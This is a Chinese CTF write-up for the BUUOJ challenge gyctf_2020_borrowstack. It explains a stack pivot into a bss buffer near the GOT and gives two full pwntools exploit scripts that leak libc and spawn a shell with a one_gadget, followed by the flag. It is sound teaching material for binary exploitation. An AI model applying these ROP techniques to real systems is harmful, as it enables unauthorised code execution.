# gyctf_2020_borrowstack

[题目地址](https://buuoj.cn/challenges#gyctf_2020_borrowstack)

稍微出点问题我就不会了。

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

main函数没有废话。

```python
undefined8 main(void)

{
  undefined local_68 [96];
  
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  puts(&DAT_00400728);
  read(0,local_68,0x70);
  puts("Done!You can check and use your borrow stack now!");
  read(0,bank,0x100);
  return 0;
}
```

程序内无system，那就是ret2libc了。read函数可溢出的字节数明显不够，加上程序中有将输入读入到bss段的逻辑，种种迹象表明这是个栈迁移。思路很简单，local_68里装栈迁移的payload，bank里装真正ret2libc需要的payload。

但[wp](https://blog.csdn.net/BengDouLove/article/details/105676078)告诉我们这题有两个问题。第一，bank的地址和got表非常接近，如果直接把栈迁移到bank，执行各种函数时开辟的栈会覆盖掉got表，之后重要函数就没法用了。第二，system无法使用，只能直接one_gadget。第二点不是问题，第一点怎么解决呢？

两种办法。第一种办法：

```python
from pwn import *

context(os='linux',arch='amd64',log_level='debug')

sh = remote("node4.buuoj.cn","26184")

bank_addr = 0x601080
leave_addr = 0x400699
pop_rdi_ret = 0x400703
puts_plt = 0x4004e0
libc_s_got = 0x601030
read_got = 0x601028
main_addr = 0x400626

one_gadget = 0x4526a #[rsp + 0x30] = null

sh.recvuntil("Ｗelcome to Stack bank,Tell me what you want\n")
x = b'A' * 0x60 + p64(bank_addr+0xd0) + p64(leave_addr)  #栈迁移。此处迁移目标地址是bank_addr+0xd0。增加的大小无特殊意义，适当范围内不会覆盖掉got表就好
sh.send(x)

sh.recvuntil("Done!You can check and use your borrow stack now!\n")
x = p64(0x0) * 0x1a + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(libc_s_got) + p64(puts_plt) +  p64(main_addr) #p64(0x0) * 0x1a填充刚才的0xd0，让ropchain从bank+0xd0开始。p64(0xdeadbeef)是栈迁移标准操作，迁移过来后前4个字节会被弹进ebp，我们要保留paylaod，就加个填充。最后才是要执行的payload
sh.send(x)

libc_s_addr = u64(sh.recvline()[:-1].ljust(8,b'\x00'))
print(hex(libc_s_addr))
system_addr = libc_s_addr + 0x24c50
binsh = libc_s_addr + 0x16c617
libc_base = libc_s_addr - 0x020740

sh.recvuntil("Ｗelcome to Stack bank,Tell me what you want\n")
x = b'A' * 0x60 + p64(bank_addr) + p64(leave_addr)
sh.send(x)

sh.recvuntil("Done!You can check and use your borrow stack now!\n")
x = p64(0xdeadbeef) + p64(one_gadget + libc_base) + p64(0x0) * 10
sh.send(x)
sh.interactive()
```

或者选择使用ret，像这位[大佬](https://blog.csdn.net/mcmuyanga/article/details/109728490)一样：

```python
from pwn import *
from LibcSearcher import *
r=remote('node3.buuoj.cn',29385)

bank=0x0601080
leave=0x400699
puts_plt=0x04004E0
puts_got=0x0601018
pop_rdi=0x400703
main=0x0400626
ret=0x4004c9

r.recvuntil('u want')
payload=b'a'*0x60+p64(bank)+p64(leave)   #栈迁移，这次直接返回到bank
r.send(payload)

r.recvuntil('now!')
payload=p64(ret)*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)   #前4个字节被弹入ebp，因此实际执行了19个ret，问题不大。每次ret 栈都会抬高，19次ret后当前执行栈就离got表很远了
r.send(payload)
r.recvline()
puts_addr=u64(r.recv(6).ljust(8,b'\x00'))
print hex(puts_addr)

libc=LibcSearcher('puts',puts_addr)
libc_base=puts_addr-libc.dump('puts')

one_gadget=libc_base+0x4526a
payload=b'a'*(0x60+8)+p64(one_gadget)
r.send(payload)

r.interactive()
```

## Flag
> flag{3003f760-fa11-4f8f-856c-82c6a789c102}